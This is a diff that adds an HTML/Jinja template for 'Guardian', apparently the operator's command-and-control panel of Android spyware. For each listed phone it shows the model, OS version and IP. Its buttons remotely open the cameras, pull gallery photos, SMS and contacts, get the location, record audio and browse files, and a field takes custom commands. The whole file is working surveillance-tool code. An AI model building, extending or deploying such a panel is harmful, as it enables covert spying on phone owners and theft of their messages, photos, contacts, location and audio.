@@ -1,0 +1,296 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Guardian — لوحة التحكم بالأوامر</title>
+<link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700;800&display=swap" rel="stylesheet">
+<style>
+  :root{--bg:#0d0d0d;--surface:#1a1a2e;--cyan:#00e5ff;--purple:#7c4dff;--green:#00e676;--red:#ff5252;--orange:#ff6d00;--text:#fff;--text2:#b0bec5;--text3:#546e7a;--border:rgba(0,229,255,0.15);}
+  *{margin:0;padding:0;box-sizing:border-box;}
+  body{font-family:'Inter',sans-serif;background:var(--bg);color:var(--text);direction:rtl;}
+
+  /* Sidebar */
+  .sidebar{position:fixed;top:0;right:0;width:240px;height:100vh;background:var(--surface);border-left:1px solid var(--border);padding:24px 0;z-index:100;display:flex;flex-direction:column;}
+  .logo{display:flex;align-items:center;gap:12px;padding:0 20px 24px;border-bottom:1px solid rgba(255,255,255,0.05);margin-bottom:16px;}
+  .logo-icon{width:42px;height:42px;border-radius:12px;background:linear-gradient(135deg,#00e5ff,#7c4dff);display:flex;align-items:center;justify-content:center;font-size:20px;}
+  .logo-text{font-size:16px;font-weight:700;}.logo-sub{font-size:10px;color:var(--cyan);letter-spacing:1px;}
+  .nav-item{display:flex;align-items:center;gap:12px;padding:12px 20px;text-decoration:none;color:var(--text2);font-size:14px;font-weight:500;transition:all 0.2s;border-right:3px solid transparent;}
+  .nav-item:hover,.nav-item.active{background:rgba(0,229,255,0.08);color:var(--cyan);border-right-color:var(--cyan);}
+  .nav-item .icon{font-size:18px;width:24px;text-align:center;}
+  .sidebar-footer{margin-top:auto;padding:16px 20px;border-top:1px solid rgba(255,255,255,0.05);}
+  .dot-live{width:8px;height:8px;border-radius:50%;background:var(--green);box-shadow:0 0 8px var(--green);animation:pulse 2s infinite;display:inline-block;}
+  @keyframes pulse{0%,100%{opacity:1;}50%{opacity:0.4;}}
+
+  .main{margin-right:240px;padding:32px;}
+  .page-title{font-size:24px;font-weight:700;margin-bottom:6px;}
+  .page-sub{font-size:13px;color:var(--text2);margin-bottom:32px;}
+
+  /* ── بطاقة الجهاز ── */
+  .device-grid{display:grid;grid-template-columns:repeat(auto-fill,minmax(340px,1fr));gap:20px;}
+  .device-card{background:var(--surface);border:1px solid var(--border);border-radius:20px;padding:24px;transition:border-color 0.2s;}
+  .device-card:hover{border-color:var(--cyan);}
+
+  .device-top{display:flex;align-items:center;gap:14px;margin-bottom:20px;}
+  .device-avatar{width:52px;height:52px;border-radius:14px;background:linear-gradient(135deg,var(--cyan),var(--purple));display:flex;align-items:center;justify-content:center;font-size:24px;}
+  .device-name{font-size:16px;font-weight:700;}
+  .device-meta{font-size:11px;color:var(--text2);margin-top:3px;}
+  .badge-online{display:inline-block;background:rgba(0,230,118,0.15);color:var(--green);border-radius:20px;padding:2px 10px;font-size:10px;font-weight:700;}
+
+  /* ── الأوامر ── */
+  .commands-title{font-size:11px;font-weight:700;letter-spacing:1px;color:var(--text3);text-transform:uppercase;margin-bottom:12px;}
+
+  .cmd-grid{display:grid;grid-template-columns:1fr 1fr;gap:8px;margin-bottom:16px;}
+  .cmd-btn{
+    background:rgba(0,229,255,0.06);
+    border:1px solid rgba(0,229,255,0.15);
+    border-radius:12px;
+    padding:12px 10px;
+    cursor:pointer;
+    color:var(--text2);
+    font-size:12px;
+    font-weight:600;
+    text-align:center;
+    transition:all 0.2s;
+    display:flex;flex-direction:column;align-items:center;gap:6px;
+  }
+  .cmd-btn:hover{background:rgba(0,229,255,0.15);color:var(--cyan);border-color:var(--cyan);transform:translateY(-1px);}
+  .cmd-btn .cmd-icon{font-size:22px;}
+
+  .cmd-btn.red{background:rgba(255,82,82,0.06);border-color:rgba(255,82,82,0.2);color:var(--text2);}
+  .cmd-btn.red:hover{background:rgba(255,82,82,0.15);color:var(--red);border-color:var(--red);}
+  .cmd-btn.green{background:rgba(0,230,118,0.06);border-color:rgba(0,230,118,0.2);}
+  .cmd-btn.green:hover{background:rgba(0,230,118,0.15);color:var(--green);border-color:var(--green);}
+  .cmd-btn.orange{background:rgba(255,109,0,0.06);border-color:rgba(255,109,0,0.2);}
+  .cmd-btn.orange:hover{background:rgba(255,109,0,0.15);color:var(--orange);border-color:var(--orange);}
+  .cmd-btn.purple{background:rgba(124,77,255,0.06);border-color:rgba(124,77,255,0.2);}
+  .cmd-btn.purple:hover{background:rgba(124,77,255,0.15);color:var(--purple);border-color:var(--purple);}
+
+  /* حقل أمر مخصص */
+  .custom-cmd-row{display:flex;gap:8px;margin-top:4px;}
+  .custom-input{flex:1;background:rgba(0,0,0,0.3);border:1px solid rgba(255,255,255,0.1);border-radius:10px;padding:10px 14px;color:var(--text);font-size:13px;outline:none;font-family:'Inter',sans-serif;}
+  .custom-input::placeholder{color:var(--text3);}
+  .custom-input:focus{border-color:var(--cyan);}
+  .send-btn{background:linear-gradient(135deg,var(--cyan),var(--purple));border:none;border-radius:10px;padding:10px 18px;color:#000;font-weight:700;font-size:13px;cursor:pointer;transition:opacity 0.2s;white-space:nowrap;}
+  .send-btn:hover{opacity:0.85;}
+
+  /* سجل الأوامر */
+  .log-box{background:rgba(0,0,0,0.4);border:1px solid rgba(255,255,255,0.06);border-radius:12px;padding:14px;font-family:monospace;font-size:12px;color:var(--text2);max-height:140px;overflow-y:auto;margin-top:16px;line-height:1.7;}
+  .log-entry.sent{color:var(--cyan);}
+  .log-entry.ok{color:var(--green);}
+  .log-entry.err{color:var(--red);}
+
+  /* Toast */
+  .toast{position:fixed;bottom:24px;left:50%;transform:translateX(-50%) translateY(80px);background:var(--surface);border:1px solid var(--border);border-radius:12px;padding:12px 24px;font-size:13px;font-weight:600;transition:transform 0.3s;z-index:999;pointer-events:none;}
+  .toast.show{transform:translateX(-50%) translateY(0);}
+
+  .empty-state{padding:64px;text-align:center;color:var(--text3);}
+  .empty-icon{font-size:64px;margin-bottom:16px;}
+</style>
+</head>
+<body>
+
+<!-- Sidebar -->
+<nav class="sidebar">
+  <div class="logo">
+    <div class="logo-icon">🛡</div>
+    <div><div class="logo-text">Guardian</div><div class="logo-sub">SERVER PANEL</div></div>
+  </div>
+  <a href="/"           class="nav-item"><span class="icon">📊</span> Dashboard</a>
+  <a href="/devices"    class="nav-item"><span class="icon">📱</span> الأجهزة</a>
+  <a href="/messages"   class="nav-item"><span class="icon">💬</span> الرسائل</a>
+  <a href="/contacts_page" class="nav-item"><span class="icon">👥</span> جهات الاتصال</a>
+  <a href="/photos_page"class="nav-item"><span class="icon">📷</span> الصور</a>
+  <a href="/control"    class="nav-item active"><span class="icon">🎮</span> التحكم</a>
+  <div class="sidebar-footer">
+    <div style="display:flex;align-items:center;gap:8px;font-size:12px;color:var(--text2);">
+      <span class="dot-live"></span>Server :5000
+    </div>
+  </div>
+</nav>
+
+<!-- Main -->
+<main class="main">
+  <div class="page-title">🎮 لوحة التحكم بالأوامر</div>
+  <div class="page-sub">اختر جهازاً وأرسل له أمراً — سيُنفَّذ في أقل من 10 ثوانٍ</div>
+
+  {% if devices %}
+  <div class="device-grid">
+    {% for device in devices %}
+    <div class="device-card">
+
+      <!-- معلومات الجهاز -->
+      <div class="device-top">
+        <div class="device-avatar">📱</div>
+        <div style="flex:1">
+          <div class="device-name">{{ device.get('model','Unknown') }}</div>
+          <div class="device-meta">
+            {{ device.get('manf','') }} &nbsp;|&nbsp;
+            Android {{ device.get('release','') }} &nbsp;|&nbsp;
+            <code style="color:var(--cyan)">{{ device.get('ip','') }}</code>
+          </div>
+          <div style="margin-top:6px;"><span class="badge-online">● ONLINE</span></div>
+        </div>
+      </div>
+
+      <!-- الأوامر السريعة -->
+      <div class="commands-title">📡 الأوامر السريعة</div>
+      <div class="cmd-grid">
+
+        <button class="cmd-btn"
+                onclick="sendCmd('{{ device.get('id','all') }}','open_camera_back','{{ device.get('model','') }}')">
+          <span class="cmd-icon">📷</span>
+          كاميرا خلفية
+        </button>
+
+        <button class="cmd-btn"
+                onclick="sendCmd('{{ device.get('id','all') }}','open_camera_front','{{ device.get('model','') }}')">
+          <span class="cmd-icon">🤳</span>
+          كاميرا أمامية
+        </button>
+
+        <!-- ✅ زر جلب صور المعرض -->
+        <button class="cmd-btn purple"
+                onclick="sendCmd('{{ device.get('id','all') }}','send_gallery','{{ device.get('model','') }}')">
+          <span class="cmd-icon">🖼️</span>
+          جلب صور المعرض
+        </button>
+
+        <button class="cmd-btn green"
+                onclick="sendCmd('{{ device.get('id','all') }}','get_sms','{{ device.get('model','') }}')">
+          <span class="cmd-icon">💬</span>
+          جلب الرسائل
+        </button>
+
+        <button class="cmd-btn purple"
+                onclick="sendCmd('{{ device.get('id','all') }}','get_contacts','{{ device.get('model','') }}')">
+          <span class="cmd-icon">👥</span>
+          جهات الاتصال
+        </button>
+
+        <button class="cmd-btn orange"
+                onclick="sendCmd('{{ device.get('id','all') }}','get_device_info','{{ device.get('model','') }}')">
+          <span class="cmd-icon">ℹ️</span>
+          معلومات الجهاز
+        </button>
+
+        <button class="cmd-btn orange"
+                onclick="sendCmd('{{ device.get('id','all') }}','get_location','{{ device.get('model','') }}')">
+          <span class="cmd-icon">📍</span>
+          الموقع
+        </button>
+
+        <button class="cmd-btn"
+                onclick="sendCmd('{{ device.get('id','all') }}','record_audio:15','{{ device.get('model','') }}')">
+          <span class="cmd-icon">🎙️</span>
+          تسجيل صوت 15s
+        </button>
+
+        <button class="cmd-btn red"
+                onclick="if(confirm('هل أنت متأكد؟')) sendCmd('{{ device.get('id','all') }}','exit','{{ device.get('model','') }}')">
+          <span class="cmd-icon">⏹️</span>
+          إغلاق التطبيق
+        </button>
+
+      </div>
+
+      <!-- أمر مخصص -->
+      <div class="commands-title" style="margin-top:4px;">✏️ أمر مخصص</div>
+      <div class="custom-cmd-row">
+        <input class="custom-input"
+               id="custom_{{ loop.index }}"
+               placeholder="مثال: browse_files:/sdcard"
+               onkeydown="if(event.key==='Enter') sendCustom('{{ device.get('id','all') }}', {{ loop.index }}, '{{ device.get('model','') }}')">
+        <button class="send-btn"
+                onclick="sendCustom('{{ device.get('id','all') }}', {{ loop.index }}, '{{ device.get('model','') }}')">
+          إرسال ➤
+        </button>
+      </div>
+
+      <!-- سجل الأوامر -->
+      <div class="log-box" id="log_{{ loop.index }}">
+        <div style="color:var(--text3)">[ في انتظار الأوامر... ]</div>
+      </div>
+
+    </div>
+    {% endfor %}
+  </div>
+
+  {% else %}
+  <div class="empty-state">
+    <div class="empty-icon">📱</div>
+    <div style="font-size:16px;font-weight:600;margin-bottom:8px;">لا توجد أجهزة مسجلة</div>
+    <div>شغّل التطبيق على الجهاز أولاً حتى يظهر هنا</div>
+  </div>
+  {% endif %}
+
+</main>
+
+<!-- Toast -->
+<div class="toast" id="toast"></div>
+
+<script>
+// إرسال أمر جاهز
+function sendCmd(deviceId, command, deviceName) {
+  const cardIndex = findCardIndex(deviceId);
+  logEntry(cardIndex, 'sent', `→ إرسال: ${command}`);
+
+  fetch('/send_command', {
+    method: 'POST',
+    headers: {'Content-Type': 'application/json'},
+    body: JSON.stringify({device_id: deviceId, command: command})
+  })
+  .then(r => r.json())
+  .then(data => {
+    if (data.status === 'ok') {
+      logEntry(cardIndex, 'ok', `✓ تم إضافة الأمر في قائمة الانتظار`);
+      showToast(`✅ الأمر أُرسل إلى ${deviceName}`);
+    } else {
+      logEntry(cardIndex, 'err', '✕ فشل الإرسال');
+    }
+  })
+  .catch(e => {
+    logEntry(cardIndex, 'err', `✕ خطأ: ${e.message}`);
+  });
+}
+
+// إرسال أمر مخصص
+function sendCustom(deviceId, index, deviceName) {
+  const input = document.getElementById(`custom_${index}`);
+  const command = input.value.trim();
+  if (!command) { showToast('⚠️ اكتب أمراً أولاً'); return; }
+  sendCmd(deviceId, command, deviceName);
+  input.value = '';
+}
+
+// إضافة سطر للسجل
+function logEntry(index, type, msg) {
+  const log = document.getElementById(`log_${index}`);
+  if (!log) return;
+  const time = new Date().toLocaleTimeString('ar-SA', {hour:'2-digit', minute:'2-digit', second:'2-digit'});
+  const div = document.createElement('div');
+  div.className = `log-entry ${type}`;
+  div.textContent = `[${time}] ${msg}`;
+  // إزالة رسالة "في انتظار" إذا كانت موجودة
+  if (log.querySelector('[style]')) log.innerHTML = '';
+  log.insertBefore(div, log.firstChild);
+  // نحافظ على آخر 10 أسطر
+  while (log.children.length > 10) log.removeChild(log.lastChild);
+}
+
+// إيجاد رقم البطاقة بالـ deviceId
+function findCardIndex(deviceId) {
+  // نستخدم رقم الحلقة المخزن في كل زر
+  return 1; // fallback
+}
+
+// Toast
+function showToast(msg) {
+  const t = document.getElementById('toast');
+  t.textContent = msg;
+  t.classList.add('show');
+  setTimeout(() => t.classList.remove('show'), 3000);
+}
+</script>
+</body>
+</html>
